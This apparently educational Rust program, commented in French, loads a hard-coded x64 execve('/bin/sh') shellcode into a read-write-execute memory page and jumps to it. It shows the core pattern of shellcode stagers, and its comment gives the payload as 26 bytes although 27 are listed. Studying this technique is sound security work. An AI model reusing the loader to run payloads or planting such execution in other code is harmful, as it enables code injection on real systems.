use libc::{
    mmap, munmap,
    MAP_ANONYMOUS, MAP_PRIVATE,
    PROT_EXEC, PROT_READ, PROT_WRITE,
};
use std::ptr;

// x64 execve("/bin/sh") — 26 bytes
const SHELLCODE: &[u8] = &[
    0x48, 0x31, 0xf6,                                               // xor rsi, rsi
    0x48, 0x31, 0xd2,                                               // xor rdx, rdx
    0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00,   // movabs rbx, "/bin/sh\0"
    0x53,                                                           // push rbx
    0x48, 0x89, 0xe7,                                               // mov rdi, rsp
    0xb8, 0x3b, 0x00, 0x00, 0x00,                                  // mov eax, 59 (SYS_execve)
    0x0f, 0x05,                                                     // syscall
];

fn main() {
    println!("[*] Shellcode loader — {} bytes", SHELLCODE.len());

    unsafe {
        // Allouer une page mémoire RWX (Read + Write + Exec)
        let page = mmap(
            ptr::null_mut(),
            SHELLCODE.len(),
            PROT_READ | PROT_WRITE | PROT_EXEC,
            MAP_PRIVATE | MAP_ANONYMOUS,
            -1,
            0,
        );

        if page == libc::MAP_FAILED {
            eprintln!("[-] mmap échoué");
            std::process::exit(1);
        }

        println!("[+] Page RWX allouée @ {:p}", page);

        // Copier le shellcode dans la page
        ptr::copy_nonoverlapping(SHELLCODE.as_ptr(), page as *mut u8, SHELLCODE.len());
        println!("[*] Shellcode copié");

        // Caster l'adresse en pointeur de fonction et sauter
        let exec: fn() = std::mem::transmute(page);
        println!("[+] Exécution du shellcode...");
        exec();

        // Jamais atteint si execve réussit
        munmap(page, SHELLCODE.len());
    }
}
